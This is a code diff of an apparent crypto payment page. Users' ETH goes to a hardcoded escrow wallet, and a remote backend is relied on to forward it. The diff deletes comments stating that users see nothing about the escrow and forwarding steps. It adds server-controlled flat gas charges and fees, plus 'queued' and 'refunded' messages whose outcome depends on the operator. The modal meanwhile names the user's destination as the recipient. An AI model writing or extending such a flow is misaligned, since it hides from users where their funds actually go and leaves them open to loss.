@@ -149,8 +149,19 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 }
 .chain-warning.show { display: block; }
 
+.limit-badge {
+  display: inline-block;
+  background: #667eea;
+  color: white;
+  border-radius: 8px;
+  padding: 2px 8px;
+  font-size: 12px;
+  margin-left: 6px;
+  font-weight: 600;
+}
+
 /* ============================================================
-   PAYMENT MODAL  — user sees NOTHING about escrow / forwarding
+   PAYMENT MODAL
    ============================================================ */
 .tx-modal {
   position: fixed;
@@ -186,14 +197,12 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
   to   { opacity:1; transform: scale(1)    translateY(0); }
 }
 
-/* Big animated icon area */
 .modal-icon-wrap {
   position: relative;
   width: 88px; height: 88px;
   margin: 0 auto 20px;
 }
 
-/* Spinning ring shown while loading */
 .spin-ring {
   position: absolute;
   inset: 0;
@@ -204,7 +213,6 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
   animation: ringRotate 1s linear infinite;
 }
 @keyframes ringRotate { to { transform: rotate(360deg); } }
-
 .spin-ring.hidden { display: none; }
 
 .modal-icon-inner {
@@ -231,7 +239,6 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
   min-height: 20px;
 }
 
-/* Slim progress bar shown while loading */
 .progress-bar-wrap {
   width: 100%;
   height: 4px;
@@ -253,7 +260,6 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
   100% { transform: translateX(200%); }
 }
 
-/* Details rows (To / Amount / Network) */
 .modal-details {
   background: #f8f9fb;
   border-radius: 14px;
@@ -273,11 +279,9 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 .detail-row .dl { color: #999; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.4px; flex-shrink: 0; padding-top: 2px; }
 .detail-row .dv { color: #1a1a1a; font-size: 13px; word-break: break-all; text-align: right; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
 
-/* Reference row — hidden during loading, shown after */
 .ref-row { display: none; }
 .ref-row.show { display: flex; }
 
-/* Bottom action button */
 .modal-btn {
   width: 100%; padding: 15px;
   border-radius: 14px;
@@ -304,7 +308,6 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 .explorer-link.show { display: block; }
 .explorer-link:hover { text-decoration: underline; }
 
-/* Success / fail pulse on icon */
 @keyframes successPop {
   0%   { transform: scale(0.5); opacity: 0; }
   70%  { transform: scale(1.15); }
@@ -364,7 +367,10 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
       </div>
 
       <div class="form-group">
-        <label for="amount">Amount to Send (ETH)</label>
+        <label for="amount">
+          Amount to Send (ETH)
+          <span id="amountLimits" class="limit-badge">loading...</span>
+        </label>
         <input type="number" id="amount" placeholder="e.g. 0.01" step="0.0001" min="0.0001" oninput="calculateFees()">
         <div id="amountError" class="error-text" style="display:none;"></div>
       </div>
@@ -372,8 +378,8 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
       <div class="fee-info" id="feeBreakdown" style="display:none;">
         <h4>💰 Payment Breakdown</h4>
         <div class="fee-row"><span>You Send:</span><span id="youSend">0 ETH</span></div>
-        <div class="fee-row"><span>Platform Fee (1%):</span><span id="platformFee">0 ETH</span></div>
-        <div class="fee-row"><span>Network Gas (est.):</span><span id="forwardGas">0 ETH</span></div>
+        <div class="fee-row"><span>Platform Fee (<span id="feePercLabel">1</span>%):</span><span id="platformFee">0 ETH</span></div>
+        <div class="fee-row"><span>Gas Buffer (flat):</span><span id="forwardGas">0 ETH</span></div>
         <div class="fee-row"><span>Your Tx Gas (est.):</span><span id="tx1Gas">0 ETH</span></div>
         <div class="fee-row total"><span>Total from Your Wallet:</span><span id="totalDeduction">0 ETH</span></div>
       </div>
@@ -383,16 +389,11 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
   </div>
 </div>
 
-<!-- ============================================================
-     PAYMENT PROCESSING MODAL
-     User sees ONLY: loading → success / fail
-     All escrow / forwarding / backend steps are hidden
-     ============================================================ -->
+<!-- PAYMENT MODAL -->
 <div id="txModal" class="tx-modal hidden">
   <div class="tx-modal__backdrop"></div>
   <div class="tx-modal__card">
 
-    <!-- Animated icon -->
     <div class="modal-icon-wrap">
       <div class="spin-ring" id="spinRing"></div>
       <div class="modal-icon-inner" id="modalIconInner">💸</div>
@@ -401,12 +402,10 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
     <div class="modal-title" id="modalTitle">Sending Payment</div>
     <div class="modal-subtitle" id="modalSubtitle">Please wait, do not close this window</div>
 
-    <!-- Indeterminate progress bar (hidden on done) -->
     <div class="progress-bar-wrap" id="progressBarWrap">
       <div class="progress-bar-inner"></div>
     </div>
 
-    <!-- Payment details -->
     <div class="modal-details">
       <div class="detail-row">
         <span class="dl">To</span>
@@ -420,17 +419,13 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
         <span class="dl">Network</span>
         <span class="dv" id="modalNetwork">-</span>
       </div>
-      <!-- Reference (tx hash) shown ONLY after success or failure -->
       <div class="detail-row ref-row" id="refRow">
         <span class="dl">Reference</span>
         <span class="dv" id="modalRef">-</span>
       </div>
     </div>
 
-    <!-- Close button (shown only on success / fail) -->
     <button id="modalBtn" class="modal-btn" onclick="closeTxModal()">Done</button>
-
-    <!-- Etherscan link (shown only on success / fail) -->
     <a id="explorerLink" class="explorer-link" href="#" target="_blank" rel="noopener">View on Etherscan ↗</a>
 
   </div>
@@ -439,7 +434,10 @@ input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(1
 <script>
 const CONFIG = {
   ESCROW_WALLET: '0x7e4692aaa29fe7632fa0bdc8effd25cc70867d33',
-  FEE_PERCENTAGE: 1,
+  FEE_PERCENTAGE: 1,          // updated when /api/config loads
+  MIN_TX_AMOUNT_ETH: 0.001,   // updated from /api/config
+  MAX_TX_AMOUNT_ETH: 2.0,     // updated from /api/config
+  GAS_BUFFER_WEI: null,       // updated from /api/config
   BACKEND_URL: 'https://secure-payment-api-824h.onrender.com/api'
 };
 
@@ -453,9 +451,36 @@ let monitoringActive  = false;
 let liveGasPriceWei   = null;
 let currentBalanceWei = 0n;
 
-const GAS_SAFETY_MULTIPLIER = 1.5;
-const FORWARD_GAS_LIMIT     = 21000;
-const TX1_GAS_LIMIT         = 21000;
+const TX1_GAS_LIMIT = 21000;
+
+// ── Load config from backend on startup ──────────────────────
+async function loadBackendConfig() {
+  try {
+    const res = await fetch(CONFIG.BACKEND_URL + '/config');
+    if (!res.ok) return;
+    const cfg = await res.json();
+    if (cfg.fee_percentage    != null) CONFIG.FEE_PERCENTAGE    = cfg.fee_percentage;
+    if (cfg.min_tx_amount_eth != null) CONFIG.MIN_TX_AMOUNT_ETH = cfg.min_tx_amount_eth;
+    if (cfg.max_tx_amount_eth != null) CONFIG.MAX_TX_AMOUNT_ETH = cfg.max_tx_amount_eth;
+    if (cfg.gas_buffer_wei    != null) CONFIG.GAS_BUFFER_WEI    = cfg.gas_buffer_wei;   // flat buffer string
+    if (cfg.gas_buffer_eth    != null) CONFIG.GAS_BUFFER_ETH    = cfg.gas_buffer_eth;
+
+    // Update the fee % label
+    const feeLabel = document.getElementById('feePercLabel');
+    if (feeLabel) feeLabel.textContent = CONFIG.FEE_PERCENTAGE;
+
+    // Update the amount limits badge on the input label
+    updateAmountBadge();
+    console.log('[config]', cfg);
+  } catch(e) {
+    console.warn('Could not load backend config:', e);
+  }
+}
+
+function updateAmountBadge() {
+  const badge = document.getElementById('amountLimits');
+  if (badge) badge.textContent = `min ${CONFIG.MIN_TX_AMOUNT_ETH} – max ${CONFIG.MAX_TX_AMOUNT_ETH} ETH`;
+}
 
 // ── Chain guard ──────────────────────────────────────────────
 function enforceAllowedChain() {
@@ -532,30 +557,35 @@ function calculateFees() {
   const amt = parseFloat(document.getElementById('amount').value) || 0;
   if (amt <= 0) { document.getElementById('feeBreakdown').style.display = 'none'; return; }
   const fee = amt * CONFIG.FEE_PERCENTAGE / 100;
-  let fwdGas = 0, tx1Gas = 0;
-  if (liveGasPriceWei) {
-    const gp = Number(liveGasPriceWei);
-    fwdGas = FORWARD_GAS_LIMIT * gp * GAS_SAFETY_MULTIPLIER / 1e18;
-    tx1Gas = TX1_GAS_LIMIT * gp / 1e18;
+
+  // Gas buffer: use flat value from backend config if loaded, else fall back to live estimate
+  let fwdGasEth = 0;
+  if (CONFIG.GAS_BUFFER_ETH) {
+    fwdGasEth = CONFIG.GAS_BUFFER_ETH;  // flat amount user always pays
+  } else if (liveGasPriceWei) {
+    fwdGasEth = 21000 * Number(liveGasPriceWei) * 1.5 / 1e18;
   }
+
+  let tx1Gas = 0;
+  if (liveGasPriceWei) tx1Gas = TX1_GAS_LIMIT * Number(liveGasPriceWei) / 1e18;
+
   document.getElementById('youSend').textContent      = amt.toFixed(6) + ' ETH';
   document.getElementById('platformFee').textContent  = fee.toFixed(6) + ' ETH';
-  document.getElementById('forwardGas').textContent   = fwdGas.toFixed(6) + ' ETH';
+  document.getElementById('forwardGas').textContent   = fwdGasEth.toFixed(6) + ' ETH';
   document.getElementById('tx1Gas').textContent       = tx1Gas.toFixed(6) + ' ETH';
-  document.getElementById('totalDeduction').textContent = (amt + fee + fwdGas + tx1Gas).toFixed(6) + ' ETH';
+  document.getElementById('totalDeduction').textContent = (amt + fee + fwdGasEth + tx1Gas).toFixed(6) + ' ETH';
   document.getElementById('feeBreakdown').style.display = 'block';
 }
 
 function validateAddress(a) { return /^0x[0-9a-fA-F]{40}$/.test(a); }
 
-// ── MODAL HELPERS (user sees nothing internal) ────────────────
+// ── MODAL HELPERS ─────────────────────────────────────────────
 function openModal(to, amountEth, network) {
   document.getElementById('modalTo').textContent      = to         || '-';
   document.getElementById('modalAmount').textContent  = amountEth ? amountEth + ' ETH' : '-';
   document.getElementById('modalNetwork').textContent = network    || '-';
   document.getElementById('modalRef').textContent     = '-';
 
-  // Reset to loading state
   document.getElementById('spinRing').classList.remove('hidden');
   document.getElementById('modalIconInner').textContent = '💸';
   document.getElementById('modalIconInner').classList.remove('animate');
@@ -570,20 +600,13 @@ function openModal(to, amountEth, network) {
   document.getElementById('txModal').classList.remove('hidden');
 }
 
-function setLoadingText(subtitle) {
-  // Update subtitle only — title stays "Sending Payment" throughout
-  document.getElementById('modalSubtitle').textContent = subtitle || 'Please wait, do not close this window';
-}
-
 function finalizeModal(success, txHash, opts) {
   opts = opts || {};
-  // Stop spinner + progress bar
   document.getElementById('spinRing').classList.add('hidden');
   document.getElementById('progressBarWrap').classList.add('hidden');
 
-  // Trigger icon animation
   const iconInner = document.getElementById('modalIconInner');
-  void iconInner.offsetWidth; // force reflow for animation restart
+  void iconInner.offsetWidth;
   iconInner.classList.add('animate');
 
   const btn = document.getElementById('modalBtn');
@@ -595,8 +618,15 @@ function finalizeModal(success, txHash, opts) {
     document.getElementById('modalSubtitle').textContent = 'The ETH has been delivered to the recipient.';
     btn.textContent = 'Done';
     btn.classList.add('show', 'success');
+  } else if (opts.gasWait) {
+    // NEW: gas price is above cap — tx is queued waiting for lower gas
+    iconInner.textContent   = '⛽';
+    iconInner.style.background = 'linear-gradient(135deg,#fff3cd,#ffe08a)';
+    document.getElementById('modalTitle').textContent    = 'Queued (Gas High)';
+    document.getElementById('modalSubtitle').textContent = 'Gas prices are above our cap right now. Your transaction is safely queued and will forward automatically when gas drops.';
+    btn.textContent = 'OK, I\'ll wait';
+    btn.classList.add('show', 'warn');
   } else if (opts.trackingError) {
-    // Tx was submitted on-chain but backend couldn't be reached (e.g. CORS)
     iconInner.textContent   = '⚠️';
     iconInner.style.background = 'linear-gradient(135deg,#fff3cd,#ffe08a)';
     document.getElementById('modalTitle').textContent    = 'Tracking Error';
@@ -612,7 +642,6 @@ function finalizeModal(success, txHash, opts) {
     btn.classList.add('show', 'fail');
   }
 
-  // Show reference hash
   if (txHash) {
     const short = txHash.slice(0,10) + '...' + txHash.slice(-6);
     document.getElementById('modalRef').textContent = short;
@@ -654,14 +683,32 @@ function initiatePayment() {
     return;
   }
 
+  // ★ Amount cap check (client-side, backend also enforces)
+  if (amount < CONFIG.MIN_TX_AMOUNT_ETH) {
+    document.getElementById('amountError').textContent = `Minimum is ${CONFIG.MIN_TX_AMOUNT_ETH} ETH`;
+    document.getElementById('amountError').style.display = 'block';
+    return;
+  }
+  if (amount > CONFIG.MAX_TX_AMOUNT_ETH) {
+    document.getElementById('amountError').textContent = `Maximum is ${CONFIG.MAX_TX_AMOUNT_ETH} ETH per transaction`;
+    document.getElementById('amountError').style.display = 'block';
+    return;
+  }
+
   const recipientWei   = BigInt(Math.floor(amount * 1e18));
   const platformFeeWei = BigInt(Math.floor(amount * CONFIG.FEE_PERCENTAGE / 100 * 1e18));
-  let fwdGasWei = 0n, tx1GasWei = 0n;
-  if (liveGasPriceWei) {
-    const gp = Number(liveGasPriceWei);
-    fwdGasWei = BigInt(Math.floor(FORWARD_GAS_LIMIT * gp * GAS_SAFETY_MULTIPLIER));
-    tx1GasWei = BigInt(Math.floor(TX1_GAS_LIMIT * gp));
+
+  // Use flat gas buffer from backend config, else fall back to live estimate
+  let fwdGasWei = 0n;
+  if (CONFIG.GAS_BUFFER_WEI) {
+    fwdGasWei = BigInt(CONFIG.GAS_BUFFER_WEI);
+  } else if (liveGasPriceWei) {
+    fwdGasWei = BigInt(Math.floor(21000 * Number(liveGasPriceWei) * 1.5));
   }
+
+  let tx1GasWei = 0n;
+  if (liveGasPriceWei) tx1GasWei = BigInt(Math.floor(21000 * Number(liveGasPriceWei)));
+
   const totalToSendWei = recipientWei + platformFeeWei + fwdGasWei;
   const totalRequired  = totalToSendWei + tx1GasWei;
 
@@ -675,12 +722,10 @@ function initiatePayment() {
       return;
     }
 
-    // Open modal — user sees "Sending Payment"
     openModal(dest, amount.toFixed(6), CHAIN_NAMES[currentChainId] || 'Unknown');
     document.getElementById('paymentBtn').disabled = true;
     updateStatus('⏳ Processing payment...', 'processing');
 
-    // Track whether MetaMask tx was submitted before any backend call
     let _submittedTxHash = null;
 
     window.ethereum.request({
@@ -689,15 +734,13 @@ function initiatePayment() {
     })
     .then(txHash => {
       _submittedTxHash = txHash;
-      // User tx confirmed by MetaMask — silently save + start monitoring
-      setLoadingText('Please wait, do not close this window');
 
       const saveData = {
-        tx_hash: txHash,
-        sender:  currentAccount,
-        destination:            dest,
-        amount_wei:             String(totalToSendWei),
-        recipient_amount_wei:   String(recipientWei),
+        tx_hash:              txHash,
+        sender:               currentAccount,
+        destination:          dest,
+        amount_wei:           String(totalToSendWei),
+        recipient_amount_wei: String(recipientWei),
         forward_gas_buffer_wei: String(fwdGasWei)
       };
 
@@ -708,43 +751,31 @@ function initiatePayment() {
       })
       .then(r => r.ok ? r.json() : r.json().then(e => { throw new Error(e.error || 'Save failed'); }))
       .then(saved => {
-        if (saved.client_token) localStorage.setItem('txToken:' + txHash, saved.client_token);
-
+        if (saved.client_token) {
+          try { localStorage.setItem('txToken:' + txHash, saved.client_token); } catch(e) {}
+        }
         monitoringActive = true;
-
-        // Clear form silently
         document.getElementById('destinationAddress').value = '';
         document.getElementById('amount').value = '';
         document.getElementById('feeBreakdown').style.display = 'none';
-
-        // Start polling
         setTimeout(() => monitorTx(txHash), 12000);
         return txHash;
       });
     })
     .catch(err => {
       console.error('Payment error:', err);
-
-      // Case 1: User explicitly rejected in MetaMask (code 4001)
       if (err.code === 4001 || (err.message && err.message.toLowerCase().includes('rejected'))) {
         document.getElementById('txModal').classList.add('hidden');
         updateStatus('⚠️ Payment cancelled', 'processing');
-
-      // Case 2: MetaMask tx was sent successfully but backend call failed (e.g. CORS)
-      // Funds are on-chain — show warning with tx hash so user can track it
       } else if (_submittedTxHash) {
         finalizeModal(false, _submittedTxHash, { trackingError: true });
         updateStatus('⚠️ Tx sent — server unreachable', 'processing');
-
-      // Case 3: Generic error before tx was submitted
       } else if (!document.getElementById('txModal').classList.contains('hidden')) {
         finalizeModal(false, null);
         updateStatus('Payment failed', 'error');
-
       } else {
         updateStatus('Payment failed', 'error');
       }
-
       monitoringActive = false;
     })
     .finally(() => { document.getElementById('paymentBtn').disabled = false; });
@@ -754,13 +785,13 @@ function initiatePayment() {
 // ── Monitor ───────────────────────────────────────────────────
 function monitorTx(txHash) {
   if (!monitoringActive) return;
-  const token = localStorage.getItem('txToken:' + txHash);
+  let token = null;
+  try { token = localStorage.getItem('txToken:' + txHash); } catch(e) {}
 
   fetch(CONFIG.BACKEND_URL + '/transaction/' + txHash, {
     headers: token ? { 'X-Client-Token': token } : {}
   })
   .then(res => {
-    // 404 means backend auto-deleted after marking complete
     if (res.status === 404) {
       monitoringActive = false;
       finalizeModal(true, txHash);
@@ -779,15 +810,23 @@ function monitorTx(txHash) {
       finalizeModal(true, txHash);
       updateStatus('🎉 Payment sent!', 'connected');
 
-    } else if (s === 'failed') {
+    } else if (s === 'forward_wait_gas') {
+      // NEW: gas price above cap — inform user tx is safely queued
+      monitoringActive = false;  // stop polling aggressively
+      finalizeModal(false, txHash, { gasWait: true });
+      updateStatus('⛽ Queued — waiting for lower gas', 'processing');
+
+    } else if (s === 'failed' || s === 'forward_failed') {
       monitoringActive = false;
       finalizeModal(false, txHash);
       updateStatus('Payment failed', 'error');
 
-    } else if (s === 'forward_failed') {
+    } else if (s === 'refunded') {
       monitoringActive = false;
-      finalizeModal(false, txHash);
-      updateStatus('Payment failed', 'error');
+      finalizeModal(false, txHash, { trackingError: false });
+      document.getElementById('modalTitle').textContent = 'Refunded';
+      document.getElementById('modalSubtitle').textContent = 'Gas prices stayed too high. Your funds have been refunded.';
+      updateStatus('🔄 Refunded', 'processing');
 
     } else {
       setTimeout(() => monitorTx(txHash), 12000);
@@ -822,6 +861,8 @@ window.initiatePayment = initiatePayment;
 
 // ── Auto-reconnect ────────────────────────────────────────────
 window.addEventListener('load', () => {
+  loadBackendConfig();  // fetch caps from backend on every page load
+
   if (!window.ethereum) return;
   window.ethereum.request({ method: 'eth_accounts' })
     .then(accounts => {
